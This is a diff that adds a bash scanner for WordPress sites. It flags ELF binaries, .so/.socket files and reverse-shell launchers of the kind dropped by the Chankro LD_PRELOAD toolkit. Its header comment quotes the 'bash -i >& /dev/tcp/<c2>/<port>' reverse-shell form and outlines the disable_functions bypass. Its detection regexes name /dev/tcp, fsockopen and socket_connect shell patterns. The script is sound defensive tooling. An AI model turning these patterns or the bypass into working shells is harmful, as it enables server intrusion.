@@ -1,0 +1,192 @@
+#!/usr/bin/env bash
+
+#
+#   Detect native binary / reverse-shell payloads in a WordPress web tree
+#
+#   A WordPress site is PHP + assets. ELF binaries, `.so` shared objects, and
+#   `.socket` files have no legitimate place in the document root. Attackers
+#   drop them to bypass PHP's disable_functions / open_basedir hardening:
+#
+#     * Chankro toolkit  — an ELF `.so` (LD_PRELOAD payload) paired with a
+#       shell script (often named `*.socket`) that opens a reverse shell via
+#       `bash -i >& /dev/tcp/<c2>/<port>`.
+#     * disable_functions bypass `.so` — LD_PRELOAD shim that shells out, e.g.
+#       to spawn a local `php -S 127.0.0.1:<port>` server inside the web tree.
+#
+#   These are NON-PHP, so plugin/core checksum scans, `php-in-uploads`, and
+#   most signature scanners walk straight past them. They frequently survive
+#   file-based cleanups for years because cleanups grep for `.php`.
+#
+#   Real example (jerseysportszone.com, planted 2021, found 2026):
+#     wp-content/themes/twentysixteen.chankro.so    (ELF, Chankro payload)
+#     wp-content/themes/twentysixteen.acpid.socket  (sh, reverse shell to :25)
+#     .19235ant_x64.so / .27301ant_x64.so           (ELF, disable_functions bypass)
+#
+#   Detection passes (each pass is deduped against the prior):
+#     A. Extension   — any `*.so` / `*.socket` file OR directory, web-tree-wide.
+#     B. ELF magic   — any file beginning with the ELF magic (\x7fELF),
+#                      regardless of name (catches renamed payloads).
+#     C. Reverse-shell content — small text files containing /dev/tcp,
+#                      `bash -i >&`, LD_PRELOAD shell-out, or socket-connect
+#                      reverse-shell shapes, regardless of extension.
+#
+#   Output format (one row per finding):
+#     SEVERITY|TYPE|PATH|DETAIL|SIZE|MTIME
+#
+#   Where:
+#     SEVERITY = CRITICAL (ELF / reverse-shell / socket-script) or HIGH
+#                (suspicious .so/.socket name that isn't clearly benign)
+#     TYPE     = ELF_BINARY / SO_FILE / SO_DIR / SOCKET_FILE / SOCKET_DIR /
+#                REVERSE_SHELL
+#     DETAIL   = short reason (e.g. C2 endpoint, embedded command)
+#     MTIME    = YYYY-MM-DD HH:MM (plant date — often the breach timestamp)
+#
+#   Usage:
+#     captaincore ssh <site> --script=detect-binary-payloads
+#     captaincore ssh @all   --script=detect-binary-payloads --quiet --label --parallel=40
+#
+#   Flags:
+#     --quiet          Only output when findings are present (bulk scanning)
+#     --skip-uploads   Skip the ELF magic scan of wp-content/uploads (faster on
+#                      sites with huge media libraries; extension + revshell
+#                      passes still cover uploads)
+#
+
+set -uo pipefail
+
+# ── Argument parsing ─────────────────────────────────────────────
+quiet=""
+skip_uploads=""
+WP_ROOT=""
+for _arg in "$@"; do
+    case "$_arg" in
+        --quiet)        quiet=true ;;
+        --skip-uploads) skip_uploads=true ;;
+        --*) ;;
+        *)   WP_ROOT="$_arg" ;;
+    esac
+done
+
+WP_ROOT="${WP_ROOT:-.}"
+cd "$WP_ROOT" 2>/dev/null || { echo "ERROR: Cannot access $WP_ROOT"; exit 1; }
+
+if [ ! -f "wp-config.php" ] && [ -f "public/wp-config.php" ]; then
+    cd public
+elif [ ! -f "wp-config.php" ] && [ -f "public_html/wp-config.php" ]; then
+    cd public_html
+fi
+
+if [ ! -f "wp-config.php" ]; then
+    [ -z "$quiet" ] && echo "WordPress not found."
+    exit 0
+fi
+
+# ── Allowlist ────────────────────────────────────────────────────
+# The only ELF/.so files with a plausible (if rare) reason to live in a web
+# tree are commercial PHP loaders bundled by encoded plugins, and native
+# Node addons under node_modules. Everything else is guilty by default.
+# Matched against the full path; add entries as real false positives surface.
+ALLOW_PATH_REGEX='/(node_modules|\.git)/|/(ioncube|sourceguardian|sg_loader)/|loader[._-].*\.so$|ixed\..*\.so$'
+
+is_allowed() {
+    printf '%s' "$1" | grep -qE "$ALLOW_PATH_REGEX"
+}
+
+# First 4 bytes == 7f 45 4c 46  ("\x7fELF")
+is_elf() {
+    [ "$(head -c4 "$1" 2>/dev/null | od -An -tx1 2>/dev/null | tr -d ' \n')" = "7f454c46" ]
+}
+
+fmt_mtime() { date -d "@$1" '+%Y-%m-%d %H:%M' 2>/dev/null || date -r "$1" '+%Y-%m-%d %H:%M' 2>/dev/null || echo unknown; }
+fsize()  { stat -c '%s' "$1" 2>/dev/null || stat -f '%z' "$1" 2>/dev/null || echo 0; }
+fmtime() { stat -c '%Y' "$1" 2>/dev/null || stat -f '%m' "$1" 2>/dev/null || echo 0; }
+
+TMPSEEN=$(mktemp); trap 'rm -f "$TMPSEEN"' EXIT
+found_any=""
+
+emit() {
+    # emit SEVERITY TYPE PATH DETAIL  — dedups on PATH
+    # Normalize a leading "./" so Pass A (find .) and Passes B/C (find <dir>)
+    # resolve to the same key and don't double-report the same file.
+    local sev="$1" type="$2" path="${3#./}" detail="$4"
+    grep -qxF "$path" "$TMPSEEN" 2>/dev/null && return
+    echo "$path" >> "$TMPSEEN"
+    found_any=true
+    printf '%s|%s|%s|%s|%s|%s\n' "$sev" "$type" "$path" "$detail" "$(fsize "$path")" "$(fmt_mtime "$(fmtime "$path")")"
+}
+
+# Build the find prune expression for noise dirs.
+PRUNE=( -path '*/node_modules/*' -o -path '*/.git/*' )
+
+# Directories to ELF-magic-scan (Pass B). uploads optional (can be huge).
+SCAN_DIRS=( "wp-content/themes" "wp-content/plugins" "wp-content/mu-plugins" )
+[ -z "$skip_uploads" ] && SCAN_DIRS+=( "wp-content/uploads" )
+
+# ── Pass A: .so / .socket by name (files AND directories), web-tree-wide ──
+while IFS= read -r f; do
+    is_allowed "$f" && continue
+    if [ -d "$f" ]; then
+        case "$f" in
+            *.so)     emit CRITICAL SO_DIR     "$f" "directory named *.so in web tree" ;;
+            *.socket) emit CRITICAL SOCKET_DIR "$f" "directory named *.socket in web tree" ;;
+        esac
+        continue
+    fi
+    [ -f "$f" ] || continue
+    if is_elf "$f"; then
+        emit CRITICAL ELF_BINARY "$f" "ELF binary with .so/.socket extension"
+    elif head -c2 "$f" 2>/dev/null | grep -q '#!' || head -c4096 "$f" 2>/dev/null | grep -qiE '/dev/tcp/|bash -i|sh -i|LD_PRELOAD'; then
+        det="script/reverse-shell content in .so/.socket file"
+        c2=$(grep -oE '/dev/tcp/[0-9.]+/[0-9]+' "$f" 2>/dev/null | head -1)
+        [ -n "$c2" ] && det="reverse shell -> ${c2#/dev/tcp/}"
+        emit CRITICAL SOCKET_FILE "$f" "$det"
+    else
+        case "$f" in
+            *.so)     emit HIGH SO_FILE     "$f" "non-ELF file named *.so (inspect)" ;;
+            *.socket) emit HIGH SOCKET_FILE "$f" "non-script file named *.socket (inspect)" ;;
+        esac
+    fi
+done < <(find . \( "${PRUNE[@]}" \) -prune -o \( -name '*.so' -o -name '*.socket' \) -print 2>/dev/null)
+
+# ── Pass B: ELF magic byte scan in the web tree (catches renamed payloads) ──
+# Top-level web-root files (depth 1) — where hidden `.NNNNNant_x64.so` land — plus
+# the plugin/theme/mu-plugin/uploads trees. Skip files < 4 bytes.
+{
+    find . -maxdepth 1 -type f -size +3c 2>/dev/null
+    for d in "${SCAN_DIRS[@]}"; do
+        [ -d "$d" ] && find "$d" \( "${PRUNE[@]}" \) -prune -o -type f -size +3c -print 2>/dev/null
+    done
+} | while IFS= read -r f; do
+    is_allowed "$f" && continue
+    grep -qxF "$f" "$TMPSEEN" 2>/dev/null && continue
+    if is_elf "$f"; then
+        emit CRITICAL ELF_BINARY "$f" "ELF binary in web tree (no legitimate use)"
+    fi
+done
+
+# ── Pass C: reverse-shell content in small text files (any extension) ──
+# Catches the acpid.socket-style launcher even if renamed to .txt/.dat/.bin etc.
+for d in "." "${SCAN_DIRS[@]}"; do
+    [ -d "$d" ] || continue
+    depth=(); [ "$d" = "." ] && depth=(-maxdepth 1)
+    while IFS= read -r f; do
+        is_allowed "$f" && continue
+        grep -qxF "$f" "$TMPSEEN" 2>/dev/null && continue
+        # text files only; skip if it looks like a normal PHP source (those are
+        # covered by the PHP-focused scanners and would FP on legit socket code)
+        case "$f" in *.php|*.phtml|*.inc) continue ;; esac
+        if grep -qaE 'bash -i >&[[:space:]]*/dev/tcp/|sh -i >&[[:space:]]*/dev/tcp/|/dev/tcp/[0-9.]+/[0-9]+|fsockopen\(|socket_connect\(.*SOCK_STREAM' "$f" 2>/dev/null; then
+            c2=$(grep -oE '/dev/tcp/[0-9.]+/[0-9]+' "$f" 2>/dev/null | head -1)
+            det="reverse-shell pattern in non-PHP file"
+            [ -n "$c2" ] && det="reverse shell -> ${c2#/dev/tcp/}"
+            emit CRITICAL REVERSE_SHELL "$f" "$det"
+        fi
+    done < <(find "$d" "${depth[@]}" \( "${PRUNE[@]}" \) -prune -o -type f -size +10c -size -65536c -print 2>/dev/null)
+done
+
+# ── Result ───────────────────────────────────────────────────────
+if [ -z "$found_any" ]; then
+    [ -z "$quiet" ] && echo "Clean. No ELF binaries, .so/.socket files, or reverse-shell payloads detected."
+    exit 0
+fi
+exit 1
